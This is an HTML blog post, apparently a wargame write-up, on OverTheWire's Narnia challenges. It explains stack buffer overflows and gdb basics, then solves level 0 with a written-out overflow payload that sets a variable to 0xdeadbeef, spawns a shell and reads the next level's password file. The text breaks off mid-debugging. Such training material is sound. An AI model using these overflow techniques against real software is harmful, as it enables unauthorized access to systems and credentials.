<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Smashing the Stack for Fun or Wargames</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="bt3gl">

    <!-- Le styles -->
    <link rel="stylesheet" href="http://bt3gl.github.io/theme/css/bootstrap.dark.css" type="text/css" />
    <style type="text/css">
      body {
        padding-top: 60px;
        padding-bottom: 40px;
      }
      .sidebar-nav {
        padding: 9px 0;
      }
      .tag-1 {
        font-size: 13pt;
      }
      .tag-2 {
        font-size: 11pt;
      }
      .tag-2 {
        font-size: 10pt;
      }
      .tag-4 {
        font-size: 8pt;
     }
    </style>
    <link href="http://bt3gl.github.io/theme/css/bootstrap-responsive.dark.css" rel="stylesheet">
        <link href="http://bt3gl.github.io/theme/css/font-awesome.css" rel="stylesheet">

    <link href="http://bt3gl.github.io/theme/css/pygments.css" rel="stylesheet">

    <!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <!-- Le fav and touch icons -->
    <link rel="shortcut icon" href="http://bt3gl.github.io/theme/images/favicon.ico">
    <link rel="apple-touch-icon" href="http://bt3gl.github.io/theme/images/apple-touch-icon.png">
    <link rel="apple-touch-icon" sizes="72x72" href="http://bt3gl.github.io/theme/images/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="114x114" href="http://bt3gl.github.io/theme/images/apple-touch-icon-114x114.png">

    <link href="http://bt3gl.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="High Bytes by bt3gl ATOM Feed" />

  </head>

  <body>

    <div class="navbar navbar-fixed-top">
      <div class="navbar-inner">
        <div class="container-fluid">
          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </a>
          <a class="brand" href="http://bt3gl.github.io/index.html">High Bytes by bt3gl </a>
          <div class="nav-collapse">
            <ul class="nav">
                          <li class="divider-vertical"></li>


                          <ul class="nav pull-right">
                                <li><a href="http://bt3gl.github.io/authors.html">About</a></li>
                                <li><a href="https://github.com/bt3gl">GitHub</a></li>
                                <li><a href="https://twitter.com/bt3gl">Twitter</a></li>
                                <li><a href="https://coderwall.com/p/kubxjq?i=11&p=2&q=author%3Abt3gl&t%5B%5D=bt3gl">CodeWall</a></li>
                                <li><a href="projects_page/index.html">Projects</a></li>
                                <li><a href="http://bt3gl.github.io/archives.html"><b>Archives</b></a></li>

                          </ul>

            </ul>
            <!--<p class="navbar-text pull-right">Logged in as <a href="#">username</a></p>-->
          </div><!--/.nav-collapse -->
        </div>
      </div>
    </div>

    <div class="container-fluid">
      <div class="row">
        <div class="span9" id="content">
<section id="content">
        <article>
                <header>
                        <h1>
                                <a href=""
                                        rel="bookmark"
                                        title="Permalink to Smashing the Stack for Fun or Wargames">
                                        Smashing the Stack for Fun or Wargames
                                </a>
                        </h1>
                </header>
                <div class="entry-content">
                <div class="well">
<footer class="post-info">
<abbr class="published" title="2014-10-06T12:21:00">
      Mon 06 October 2014 </abbr>

<span class="label"> Category</span>
<a href="http://bt3gl.github.io/category/vulnerabilities.html"><i class="icon-folder-open"></i>Vulnerabilities</a>


<span class="label">Tags</span>
	<a href="http://bt3gl.github.io/tag/buffer.html"><i class="icon-tag"></i>Buffer</a>
	<a href="http://bt3gl.github.io/tag/overflow.html"><i class="icon-tag"></i>Overflow</a>
	<a href="http://bt3gl.github.io/tag/stack.html"><i class="icon-tag"></i>Stack</a>
	<a href="http://bt3gl.github.io/tag/nop.html"><i class="icon-tag"></i>NOP</a>
	<a href="http://bt3gl.github.io/tag/c.html"><i class="icon-tag"></i>C</a>
	<a href="http://bt3gl.github.io/tag/assembly.html"><i class="icon-tag"></i>Assembly</a>
	<a href="http://bt3gl.github.io/tag/gdb.html"><i class="icon-tag"></i>gdb</a>
	<a href="http://bt3gl.github.io/tag/wargames.html"><i class="icon-tag"></i>Wargames</a>
	<a href="http://bt3gl.github.io/tag/.html"><i class="icon-tag"></i></a>
</footer><!-- /.post-info -->                </div>
                <p><img alt="" src="http://i.imgur.com/9QKH8Nf.jpg" /></p>
<p>I have been playing the quintessential <a href="http://overthewire.org/wargames">WarGames</a>, a collection of Security problems, divided into interesting titles. To play the game you SSH to their servers with a login that indicates your current level. The purpose of the game is to solve the current level's problem to find the password for the next level.</p>
<p>Today I am talking about <a href="http://overthewire.org/wargames/narnia">Narnia</a>, the episode that is all about <strong>memory exploits</strong>. To solve Narnia's nine challenges, it's essential to understand how the <strong>Stack</strong> works in a process. To get started, the reading number is zero is the classic <a href="">Aleph One</a>'s' <a href="http://insecure.org/stf/smashstack.html">Smashing the Stack for Fun or Profit</a>, published in the <a href="">Phrack</a> magazine number 49.</p>
<h2>Buffer Overflows</h2>
<p>Buffer overflows are the result of stuffing more information into a buffer than it is meant to hold.  Since C does not have any built-in bounds checking, overflows often manifest themselves as writing past the end of a character array.  The standard C library provides a number of functions for copying or appending strings, that perform no boundary checking. They include: strcat(), strcpy(), sprintf(), and vsprintf(). These functions operate on null-terminated strings, and do not check for overflow of the receiving string.  gets() is a function that reads a line from stdin into a buffer until either a terminating newline or EOF.  It performs no checks for buffer overflows.  The scanf() family of functions can also be a problem if you are matching a sequence of non-white-space characters (%s), or matching a non-empty sequence of characters from a specified set (%[]), and the array pointed to by the char pointer, is not large enough to accept the whole sequence of characters, and you have not defined the optional maximum field width.  If the target of any of these functions is a buffer of static size, and its other argument was somehow derived from user input there is a good posibility that you might be able to exploit a buffer overflow.</p>
<p>Another usual programming construct we find is the use of a while loop to read one character at a time into a buffer from stdin or some file until the end of line, end of file, or some other delimiter is reached.  This type of construct usually uses one of these functions: getc(), fgetc(), or getchar(). If there is no explicit checks for overflows in the while loop, such programs are easily exploited.</p>
<p>Processes are divided into three regions: text, Data, and Stack.  We will concentrate on the stack region. Stack of objects has the property that the last object placed on the stack
will be the first object removed.  This property is commonly referred to as last in, first out queue, or a LIFO. If you want to understand how to create a stack in Python, for example, take a look in these notes about <a href="">Python and Algorithms</a> that I wrote.</p>
<h2>Playing Narnia</h2>
<h3>The Scenario</h3>
<p>In each of Narnias level we are able to run a <a href="http://www.thegeekstuff.com/2011/10/c-program-to-an-executable/">binary and read its C code</a> . The objective is to figure out from the code what vulnerabilyt can be used to be able to read the password of the next level (located in a folder under <code>/etc</code> in the server).</p>
<p>Narnia's level are the following:</p>
<ul>
<li>
<p>Level 0: Warm-up with a classic Stack overflow to rewrite an variable.</p>
</li>
<li>
<p>Level 1: Use an enviroment variable  with an executable eploit, which is called as a function.</p>
</li>
<li>
<p>Level 2: Use strcpy to overflow  the return address.</p>
</li>
<li>
<p>Level 3: Stack overflow overwriting file names, and use of symbolic links to read files.</p>
</li>
<li>
<p>Level 4:  Stack overflow overwritign the return address with nops:</p>
</li>
<li>
<p>Level 5: Format string vulnerabilities.</p>
</li>
<li>
<p>Level 6:</p>
</li>
<li>
<p>Level 7: Format string vulnerabilities</p>
</li>
<li>
<p>Level 8:</p>
</li>
<li>
<p>Level 9: A formal proof that your are l33t :).</p>
</li>
</ul>
<h3>Your Weapons</h3>
<p>Specifically for Narnia, there is a set of things we use in almost every level:</p>
<h4>Memory Representation</h4>
<p>When it comes to Memory Addresses, it's quintesential to understand <a href="http://en.wikipedia.org/wiki/Hexadecimal">Hexadecimal Representation</a>. You can print directly from Python using:</p>
<div class="highlight"><pre><span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &quot;</span><span class="se">\x41</span><span class="s">&quot;&#39;</span>
<span class="n">A</span>
</pre></div>


<p>Another important thing to remember is that the represnetation in x86 is [little-endian].</p>
<h4>Python:</h4>
<p>The exploit in Narnia are all delivered in form of input strings. Python with the <strong>command</strong> option, <code>-c</code>, is really handy to craft what we need. For example"</p>
<div class="highlight"><pre><span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &quot;A&quot;*20&#39;</span>
<span class="n">AAAAAAAAAAAAAAAAAAAA</span>
</pre></div>


<h4>Enviroment Variables</h4>
<h4>Commands</h4>
<ul>
<li>whoami</li>
<li>Readelf</li>
<li>xxd</li>
</ul>
<p>We can check that stack is executable by:</p>
<p>readelf - Displays information about ELF files.
narnia1@melinda:/narnia$ readelf -a narnia1 | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4</p>
<h4>Assembly</h4>
<p>nasm shellspawn.asm</p>
<p>To understand what the program does to call function() we compile it with
gcc using the -S switch to generate assembly code output:</p>
<p>$ gcc -S -o example1.s example1.c</p>
<p>pushl $3
        pushl $2
        pushl $1
        call function</p>
<div class="highlight"><pre><span class="nx">This</span> <span class="nx">pushes</span> <span class="nx">the</span> <span class="mi">3</span> <span class="nx">arguments</span> <span class="nx">to</span> <span class="kd">function</span> <span class="nx">backwards</span> <span class="nx">into</span> <span class="nx">the</span> <span class="nx">stack</span><span class="p">,</span> <span class="nx">and</span>
</pre></div>


<p>calls function().
The instruction 'call' will push the instruction pointer
(IP) onto the stack.  We'll call the saved IP the return address (RET).  The
first thing done in function is the procedure prolog:</p>
<div class="highlight"><pre>    <span class="n">pushl</span> <span class="o">%</span><span class="n">ebp</span>
    <span class="n">movl</span> <span class="o">%</span><span class="n">esp</span><span class="p">,</span><span class="o">%</span><span class="n">ebp</span>
    <span class="n">subl</span> <span class="err">$</span><span class="mi">20</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
</pre></div>


<p>This pushes EBP, the frame pointer, onto the stack.  It then copies the
current SP onto EBP, making it the new FP pointer.  We'll call the saved FP
pointer SFP.  It then allocates space for the local variables by subtracting
their size from SP.</p>
<p>SP: stack pointer ==&gt; esp
EBP: framer pointer ===&gt; ebp
FP: frame pointer (?)
SFP: saved FP</p>
<p>-- memory can only addressed in multiples of the word suze (4 bytes)</p>
<h3>gdb</h3>
<p>In almost every of the problems in Narnia, it's fundamental do undetang how to run it in debugging mode with <strong>gdb</strong>. You might want to check this <a href="http://www.thegeekstuff.com/2010/03/debug-c-program-using-gdb/">very introductory guide</a> or the this <a href="http://www.dirac.org/linux/gdb/">comprehrensive guide</a>.</p>
<ul>
<li>Starting: ``` gdb -q <EXECUTABLE>**</li>
<li>set disassembly-flavor intel</li>
<li>disas main</li>
</ul>
<p>The basic steps in a Narnia problems is:
(gdb) set disassembly-flavor intel --&gt; Set the disassembly flavor.
The valid values are "att" and "intel", and the default value is "att".
(gdb) disas main --&gt; disassemble a specified section of memory.
(gdb) b *main+<SOME NUMBER> --&gt; set breakpoint at the location
(gdb) r --&gt; run
(gdb) x/30xw A
Examine memory: x/FMT ADDRESS.
ADDRESS is an expression for the memory address to examine.
FMT is a repeat count followed by a format letter and a size letter.
Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal),
  t(binary), f(float), a(address), i(instruction), c(char) and s(string).
Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).
The specified number of objects of the specified size are printed
according to the format.</p>
<p>i f
All about selected stack frame, or frame at ADDR.
We can look at the stack by using GDB's backtrace</p>
<p>from the man page:</p>
<div class="highlight"><pre>       <span class="k">break</span> <span class="cp">[</span><span class="nb">file</span><span class="p">:</span><span class="cp">]</span><span class="nx">functiop</span>
           <span class="nx">Set</span> <span class="nx">a</span> <span class="nx">breakpoint</span> <span class="nx">at</span> <span class="kd">function</span> <span class="p">(</span><span class="k">in</span> <span class="nx">file</span><span class="p">).</span>

       <span class="nx">run</span> <span class="cp">[</span><span class="nx">arglist</span><span class="cp">]</span>
           <span class="nx">Start</span> <span class="nx">your</span> <span class="nx">program</span> <span class="p">(</span><span class="kd">with</span> <span class="nx">arglist</span><span class="p">,</span> <span class="k">if</span> <span class="nx">specified</span><span class="p">).</span>

       <span class="nx">bt</span>  <span class="nx">Backtrace</span><span class="o">:</span> <span class="nx">display</span> <span class="nx">the</span> <span class="nx">program</span> <span class="nx">stack</span><span class="p">.</span>

       <span class="nx">print</span> <span class="nx">expr</span>
           <span class="nx">Display</span> <span class="nx">the</span> <span class="nx">value</span> <span class="nx">of</span> <span class="nx">an</span> <span class="nx">expression</span><span class="p">.</span>

       <span class="nx">c</span>   <span class="nx">Continue</span> <span class="nx">running</span> <span class="nx">your</span> <span class="nx">program</span> <span class="p">(</span><span class="nx">after</span> <span class="nx">stopping</span><span class="p">,</span> <span class="nx">e</span><span class="p">.</span><span class="nx">g</span><span class="p">.</span> <span class="nx">at</span> <span class="nx">a</span> <span class="nx">breakpoint</span><span class="p">).</span>

       <span class="nx">next</span>
           <span class="nx">Execute</span> <span class="nx">next</span> <span class="nx">program</span> <span class="nx">line</span> <span class="p">(</span><span class="nx">after</span> <span class="nx">stopping</span><span class="p">);</span> <span class="nx">step</span> <span class="nx">over</span> <span class="nx">any</span> <span class="kd">function</span>
           <span class="nx">calls</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">line</span><span class="p">.</span>

       <span class="nx">edit</span> <span class="cp">[</span><span class="nb">file</span><span class="p">:</span><span class="cp">]</span><span class="kd">function</span>
           <span class="nx">look</span> <span class="nx">at</span> <span class="nx">the</span> <span class="nx">program</span> <span class="nx">line</span> <span class="nx">where</span> <span class="nx">it</span> <span class="nx">is</span> <span class="nx">presently</span> <span class="nx">stopped</span><span class="p">.</span>

       <span class="nx">list</span> <span class="cp">[</span><span class="nb">file</span><span class="p">:</span><span class="cp">]</span><span class="kd">function</span>
           <span class="nx">type</span> <span class="nx">the</span> <span class="nx">text</span> <span class="nx">of</span> <span class="nx">the</span> <span class="nx">program</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">vicinity</span> <span class="nx">of</span> <span class="nx">where</span> <span class="nx">it</span> <span class="nx">is</span> <span class="nx">presently</span>
           <span class="nx">stopped</span><span class="p">.</span>

       <span class="nx">step</span>
           <span class="nx">Execute</span> <span class="nx">next</span> <span class="nx">program</span> <span class="nx">line</span> <span class="p">(</span><span class="nx">after</span> <span class="nx">stopping</span><span class="p">);</span> <span class="nx">step</span> <span class="nx">into</span> <span class="nx">any</span> <span class="kd">function</span>
           <span class="nx">calls</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">line</span><span class="p">.</span>

       <span class="nx">help</span> <span class="cp">[</span><span class="nb">name</span><span class="cp">]</span>
           <span class="nx">Show</span> <span class="nx">information</span> <span class="nx">about</span> <span class="nx">GDB</span> <span class="nx">command</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">or</span> <span class="nx">general</span> <span class="nx">information</span> <span class="nx">about</span>
           <span class="nx">using</span> <span class="nx">GDB</span><span class="p">.</span>
</pre></div>


<hr />
<p>http://insecure.org/stf/smashstack.html</p>
<hr />
<h2>Level 0</h2>
<p>The first challenge is in this code:</p>
<div class="highlight"><pre><span class="n">narnia0</span><span class="err">@</span><span class="n">melinda</span><span class="o">:/</span><span class="n">narnia</span><span class="err">$</span> <span class="n">cat</span> <span class="n">narnia0</span><span class="p">.</span><span class="n">c</span>

<span class="cp">#include &lt;stdio.h&gt;</span>
<span class="cp">#include &lt;stdlib.h&gt;</span>

<span class="kt">int</span> <span class="n">main</span><span class="p">(){</span>
  <span class="kt">long</span> <span class="n">val</span><span class="o">=</span><span class="mh">0x41414141</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Here is your chance: &quot;</span><span class="p">);</span>
  <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%24s&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;buf: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;val: 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">val</span><span class="p">);</span>

  <span class="k">if</span><span class="p">(</span><span class="n">val</span><span class="o">==</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;WAY OFF!!!!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>The program receives an input from the user and save in a buffer variable of size 20. If the input variable is withing this range, nothing happens and the exit normally. However, what happens if the input is larger than 20 bytes? In this case, there is no  bound checkings and the input will overflows the variable buf, occupung the subsquent space in the stack.</p>
<p>Now the magic, a Memory Stack, just like a pile of books, push the varibales in the owrder they are created in your prgram. In the case above, the first thing that the Stack got was val, then buf:</p>
<div class="highlight"><pre>  <span class="kt">long</span> <span class="n">val</span><span class="o">=</span><span class="mh">0x41414141</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
</pre></div>


<p>This means that val is right below buf in the stack  (in higher memory address), so if something overflows from buf will rewrite the value of val in the memory!
This is a classical case of Stack Overflow!</p>
<p>The magic is that we can feel var with <em>anything</em> we want, and in the next levels we will see several different types of exploits using this logic. For now, being just the level 0, it's really simple: we need to make val have the hexadecimal value <code>0xdeadbeef</code>:</p>
<div class="highlight"><pre><span class="k">if</span><span class="p">(</span><span class="n">val</span><span class="o">==</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
        <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
</pre></div>


<p>In this case, we see that  the program will spawn a privileged (Bash) shell for us, where we can get access to the password for the next level.</p>
<h4>Step 1: Vizualizing the Overflow</h4>
<p>We wantt o overflow buf with 24 bytes, so that the last four bytes will overwrite val with the correct value. Let's see how <code>val</code> is filled when we oveflow byte by byte:</p>
<div class="highlight"><pre><span class="n">narnia0</span><span class="nd">@melinda</span><span class="p">:</span><span class="o">/</span><span class="n">narnia</span><span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &quot;B&quot;*24&#39;</span>
<span class="n">BBBBBBBBBBBBBBBBBBBBBBBB</span>

<span class="n">narnia0</span><span class="nd">@melinda</span><span class="p">:</span><span class="o">/</span><span class="n">narnia</span><span class="err">$</span> <span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &quot;B&quot;*19&#39;</span><span class="p">)</span> <span class="o">|</span> <span class="o">./</span><span class="n">narnia0</span>
<span class="n">Correct</span> <span class="n">val</span><span class="s">&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span>
<span class="n">Here</span> <span class="ow">is</span> <span class="n">your</span> <span class="n">chance</span><span class="p">:</span> <span class="n">buf</span><span class="p">:</span> <span class="n">BBBBBBBBBBBBBBBBBBB</span>
<span class="n">val</span><span class="p">:</span> <span class="mh">0x41414141</span>
<span class="n">WAY</span> <span class="n">OFF</span><span class="err">!!!!</span>


<span class="n">narnia0</span><span class="nd">@melinda</span><span class="p">:</span><span class="o">/</span><span class="n">narnia</span><span class="err">$</span> <span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &quot;B&quot;*20&#39;</span><span class="p">)</span> <span class="o">|</span> <span class="o">./</span><span class="n">narnia0</span>
<span class="n">Correct</span> <span class="n">val</span><span class="s">&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span>
<span class="n">Here</span> <span class="ow">is</span> <span class="n">your</span> <span class="n">chance</span><span class="p">:</span> <span class="n">buf</span><span class="p">:</span> <span class="n">BBBBBBBBBBBBBBBBBBBB</span>
<span class="n">val</span><span class="p">:</span> <span class="mh">0x41414100</span>
<span class="n">WAY</span> <span class="n">OFF</span><span class="err">!!!!</span>

<span class="n">narnia0</span><span class="nd">@melinda</span><span class="p">:</span><span class="o">/</span><span class="n">narnia</span><span class="err">$</span> <span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &quot;B&quot;*21&#39;</span><span class="p">)</span> <span class="o">|</span> <span class="o">./</span><span class="n">narnia0</span>
<span class="n">Correct</span> <span class="n">val</span><span class="s">&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span>
<span class="n">Here</span> <span class="ow">is</span> <span class="n">your</span> <span class="n">chance</span><span class="p">:</span> <span class="n">buf</span><span class="p">:</span> <span class="n">BBBBBBBBBBBBBBBBBBBBB</span>
<span class="n">val</span><span class="p">:</span> <span class="mh">0x41410042</span>
<span class="n">WAY</span> <span class="n">OFF</span><span class="err">!!!!</span>

<span class="n">narnia0</span><span class="nd">@melinda</span><span class="p">:</span><span class="o">/</span><span class="n">narnia</span><span class="err">$</span> <span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &quot;B&quot;*22&#39;</span><span class="p">)</span> <span class="o">|</span> <span class="o">./</span><span class="n">narnia0</span>
<span class="n">Correct</span> <span class="n">val</span><span class="s">&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span>
<span class="n">Here</span> <span class="ow">is</span> <span class="n">your</span> <span class="n">chance</span><span class="p">:</span> <span class="n">buf</span><span class="p">:</span> <span class="n">BBBBBBBBBBBBBBBBBBBBBB</span>
<span class="n">val</span><span class="p">:</span> <span class="mh">0x41004242</span>
<span class="n">WAY</span> <span class="n">OFF</span><span class="err">!!!!</span>

<span class="n">narnia0</span><span class="nd">@melinda</span><span class="p">:</span><span class="o">/</span><span class="n">narnia</span><span class="err">$</span> <span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &quot;B&quot;*23&#39;</span><span class="p">)</span> <span class="o">|</span> <span class="o">./</span><span class="n">narnia0</span>
<span class="n">Correct</span> <span class="n">val</span><span class="s">&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span>
<span class="n">Here</span> <span class="ow">is</span> <span class="n">your</span> <span class="n">chance</span><span class="p">:</span> <span class="n">buf</span><span class="p">:</span> <span class="n">BBBBBBBBBBBBBBBBBBBBBBB</span>
<span class="n">val</span><span class="p">:</span> <span class="mh">0x00424242</span>
<span class="n">WAY</span> <span class="n">OFF</span><span class="err">!!!!</span>

<span class="n">narnia0</span><span class="nd">@melinda</span><span class="p">:</span><span class="o">/</span><span class="n">narnia</span><span class="err">$</span> <span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &quot;B&quot;*24&#39;</span><span class="p">)</span> <span class="o">|</span> <span class="o">./</span><span class="n">narnia0</span>
<span class="n">Correct</span> <span class="n">val</span><span class="s">&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span>
<span class="n">Here</span> <span class="ow">is</span> <span class="n">your</span> <span class="n">chance</span><span class="p">:</span> <span class="n">buf</span><span class="p">:</span> <span class="n">BBBBBBBBBBBBBBBBBBBBBBBB</span>
<span class="n">val</span><span class="p">:</span> <span class="mh">0x42424242</span>
<span class="n">WAY</span> <span class="n">OFF</span><span class="err">!!!!</span>
</pre></div>


<h4>Step 2: Crafting the Exploit</h4>
<p>Now we want know that <code>val</code> starts to oveflow in the 20th byte. So we are going to add <code>deadbeef</code> in the last four bytes. However, we need to write this in Hexadecimal form, and remember that it is a little endian representation:</p>
<div class="highlight"><pre><span class="n">narnia0</span><span class="nd">@melinda</span><span class="p">:</span><span class="o">/</span><span class="n">narnia</span><span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span><span class="s">&#39;print &quot;A&quot;*20 + &quot;</span><span class="se">\xef\xbe\xad\xde</span><span class="s">&quot;&#39;</span>
<span class="n">AAAAAAAAAAAAAAAAAAAA</span><span class="err">ﾭ</span>
<span class="n">narnia0</span><span class="nd">@melinda</span><span class="p">:</span><span class="o">/</span><span class="n">narnia</span><span class="err">$</span> <span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span><span class="s">&#39;print &quot;A&quot;*20 + &quot;</span><span class="se">\xef\xbe\xad\xde</span><span class="s">&quot;&#39;</span><span class="p">)</span> <span class="o">|</span> <span class="o">./</span><span class="n">narnia0</span> <span class="n">Correct</span> <span class="n">val</span><span class="s">&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span>
<span class="n">Here</span> <span class="ow">is</span> <span class="n">your</span> <span class="n">chance</span><span class="p">:</span> <span class="n">buf</span><span class="p">:</span> <span class="n">AAAAAAAAAAAAAAAAAAAA</span><span class="err">ﾭ</span>
<span class="n">val</span><span class="p">:</span> <span class="mh">0xdeadbeef</span>
</pre></div>


<p>Yay, the exploit worked!</p>
<h4>Step 3: Getting Access to the Shell</h4>
<p>In the last step, we got access to our Shell but it closed as soon as the program ends execution. We need to make a way to keep read out password before we loose the control. A good way is pipeling some command that waits for an imput in the middle. We found that this can be made with commands such as <code>tail</code> or <code>cat</code>, however only cat will print the output:</p>
<div class="highlight"><pre>narnia0@melinda:/narnia<span class="nv">$ </span><span class="o">(</span>python -c<span class="s1">&#39;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&#39;</span>; cat<span class="o">)</span> | /narnia/narnia0
Correct val<span class="err">&#39;</span>s value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
cat /etc/narnia_pass/narnia1
</pre></div>


<p>Done! We have completed the 0th level!</p>
<h4>Step 4: Debbuging it!</h4>
<p>Altough this problem was easy enough so we didn't need to debug it to find the address, it's important to understand this process because we won't be this luck in the next levels.</p>
<p>narnia0@melinda:/narnia$ gdb ./narnia0
Reading symbols from /games/narnia/narnia0...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x080484c4 &lt;+0&gt;: push   ebp
   0x080484c5 &lt;+1&gt;: mov    ebp,esp
   0x080484c7 &lt;+3&gt;: and    esp,0xfffffff0
   0x080484ca &lt;+6&gt;: sub    esp,0x30
   0x080484cd &lt;+9&gt;: mov    DWORD PTR [esp+0x2c],0x41414141
   0x080484d5 &lt;+17&gt;:  mov    DWORD PTR [esp],0x8048640
   0x080484dc &lt;+24&gt;:  call   0x80483b0 <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#112;&#117;&#116;&#115;&#64;&#112;&#108;&#116;">&#112;&#117;&#116;&#115;&#64;&#112;&#108;&#116;</a>
   0x080484e1 &lt;+29&gt;:  mov    eax,0x8048673
   0x080484e6 &lt;+34&gt;:  mov    DWORD PTR [esp],eax
   0x080484e9 &lt;+37&gt;:  call   0x80483a0 <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#112;&#114;&#105;&#110;&#116;&#102;&#64;&#112;&#108;&#116;">&#112;&#114;&#105;&#110;&#116;&#102;&#64;&#112;&#108;&#116;</a>
   0x080484ee &lt;+42&gt;:  mov    eax,0x8048689
   0x080484f3 &lt;+47&gt;:  lea    edx,[esp+0x18]
   0x080484f7 &lt;+51&gt;:  mov    DWORD PTR [esp+0x4],edx
   0x080484fb &lt;+55&gt;:  mov    DWORD PTR [esp],eax
   0x080484fe &lt;+58&gt;:  call   0x8048400 <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#95;&#95;&#105;&#115;&#111;&#99;&#57;&#57;&#95;&#115;&#99;&#97;&#110;&#102;&#64;&#112;&#108;&#116;">&#95;&#95;&#105;&#115;&#111;&#99;&#57;&#57;&#95;&#115;&#99;&#97;&#110;&#102;&#64;&#112;&#108;&#116;</a>
   0x08048503 &lt;+63&gt;:  mov    eax,0x804868e
   0x08048508 &lt;+68&gt;:  lea    edx,[esp+0x18]
   0x0804850c &lt;+72&gt;:  mov    DWORD PTR [esp+0x4],edx
(...)
End of assembler dump.</p>
<div class="highlight"><pre><span class="n">So</span> <span class="n">let</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">put</span> <span class="n">a</span> <span class="k">break</span> <span class="n">point</span> <span class="n">right</span> <span class="n">after</span> <span class="err">```</span><span class="n">scanf</span><span class="err">```</span><span class="o">:</span>
</pre></div>


<p>(gdb) b *main+63
Breakpoint 1 at 0x8048503</p>
<div class="highlight"><pre><span class="n">Now</span> <span class="n">we</span> <span class="n">run</span> <span class="n">the</span> <span class="n">debbugged</span> <span class="n">program</span> <span class="n">with</span> <span class="mi">20</span> <span class="n">Bs</span> <span class="p">(</span><span class="err">\</span><span class="n">x42</span><span class="p">)</span> <span class="n">as</span> <span class="n">the</span> <span class="n">input</span><span class="p">.</span> <span class="n">See</span> <span class="n">that</span> <span class="n">it</span> <span class="n">stops</span> <span class="n">in</span> <span class="n">the</span> <span class="n">address</span> <span class="n">given</span> <span class="n">above</span><span class="p">,</span> <span class="n">right</span> <span class="n">after</span> <span class="n">scanf</span><span class="o">:</span>
</pre></div>


<p>(gdb) r
Starting program: /games/narnia/narnia0
Correct val's value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance:</p>
<p>Breakpoint 1, 0x08048503 in main ()</p>
